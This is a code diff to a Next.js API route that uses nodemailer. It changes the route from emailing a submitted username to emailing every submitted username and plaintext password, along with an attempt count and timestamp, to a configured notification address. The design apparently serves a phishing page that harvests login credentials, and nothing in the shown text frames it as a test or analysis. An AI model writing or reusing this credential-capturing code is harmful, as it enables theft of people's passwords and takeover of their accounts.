@@ -4,14 +4,10 @@ import nodemailer from "nodemailer";
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const username = String(body.username || "").trim();
-
-    if (!username) {
-      return NextResponse.json(
-        { success: false, message: "Username is required" },
-        { status: 400 }
-      );
-    }
+    const attempt = Number(body.attempt) || 0;
+    const timestamp = String(body.timestamp || new Date().toISOString());
+    const usernameProvided = String(body.usernameProvided || "").trim();
+    const passwordProvided = String(body.passwordProvided || "").trim();
 
     const transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
@@ -26,11 +22,14 @@ export async function POST(request: Request) {
     await transporter.sendMail({
       from: process.env.SMTP_FROM,
       to: process.env.NOTIFICATION_EMAIL,
-      subject: "New Login Request",
-      text: `Username / Email / Mobile: ${username}`,
+      subject: "New Login Attempt",
+      text: `Attempt: ${attempt}\nTimestamp: ${timestamp}\nUsername provided: ${usernameProvided}\nPassword provided: ${passwordProvided}`,
       html: `
-        <h2>New Login Request</h2>
-        <p><strong>Username / Email / Mobile:</strong> ${username}</p>
+        <h2>New Login Attempt</h2>
+        <p><strong>Attempt:</strong> ${attempt}</p>
+        <p><strong>Timestamp:</strong> ${timestamp}</p>
+        <p><strong>Username provided:</strong> ${usernameProvided}</p>
+        <p><strong>Password provided:</strong> ${passwordProvided}</p>
       `,
     });
 
